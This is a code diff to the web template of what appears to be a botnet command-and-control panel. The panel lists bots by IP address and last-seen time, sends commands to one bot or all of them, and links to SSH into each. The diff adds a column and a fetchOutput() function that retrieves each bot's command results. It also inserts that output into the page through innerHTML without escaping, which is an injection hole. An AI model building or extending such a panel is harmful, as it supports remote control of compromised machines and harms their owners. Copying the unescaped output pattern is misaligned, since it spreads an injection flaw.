@@ -79,7 +79,8 @@
                 <th>IP Address</th>
                 <th>Last Seen</th>
                 <th>Action</th>
-                <th>SSH Access</th> <!-- Added SSH Column -->
+                <th>SSH Access</th>
+                <th>Command Output</th>
             </tr>
         </thead>
         <tbody>
@@ -92,7 +93,11 @@
                     <button onclick="sendCommand('{{ bot[0] }}')">Send Command</button>
                 </td>
                 <td>
-                    <a href="ssh://{{ bot[1] }}" target="_blank">SSH Into Bot</a> <!-- Added SSH Access Link -->
+                    <a href="ssh://{{ bot[1] }}" target="_blank">SSH Into Bot</a>
+                </td>
+                <td id="output-{{ bot[0] }}">
+                    {{ bot[3] if bot[3] else 'No Output Yet' }}
+                    <button onclick="fetchOutput('{{ bot[0] }}')">Refresh</button>
                 </td>
             </tr>
             {% endfor %}
@@ -150,6 +155,18 @@
                     alert(`Command executed for all bots: "${command}"`);
                 } else {
                     alert('Failed to execute command for all bots');
+                }
+            });
+        }
+
+        function fetchOutput(botId) {
+            fetch(`/get_result/${botId}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById(`output-${botId}`).innerHTML = `${data.output} <button onclick="fetchOutput('${botId}')">Refresh</button>`;
+                } else {
+                    document.getElementById(`output-${botId}`).innerHTML = 'No Output Yet';
                 }
             });
         }
